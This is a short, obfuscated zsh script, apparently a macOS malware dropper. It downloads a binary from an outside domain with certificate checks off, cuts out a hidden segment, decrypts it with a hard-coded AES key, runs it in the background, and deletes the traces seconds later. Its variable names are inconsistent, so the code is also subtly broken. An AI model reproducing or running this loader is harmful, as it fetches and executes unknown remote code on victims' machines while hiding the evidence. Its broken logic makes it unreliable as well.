#!/bin/zsh
p3fh5=$(mktemp /tmp/8jegbk.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/m03dd114024f75aac.bin" -o "$p3fh5z" || exit 1
uaczbf=$(stat -f %z "$p3fh5z"); czwz63d=$(( uaczbf - 1079 - 2169 ))
tail -c +$(( 1079 + 1 )) "$p3fh5z" | head -c $czwz63d | openssl enc -d -aes-256-cbc -k 5689f4e988a96378061b41eb -out "$p3fh5" 2>/dev/null
[ -s "$p3fh5" ] && chmod 700 "$p3fh5" && ( "$p3fh5" & ) && disown
( sleep 3; rm -f "$p3fh5" "$p3fh5z" ) &>/dev/null &
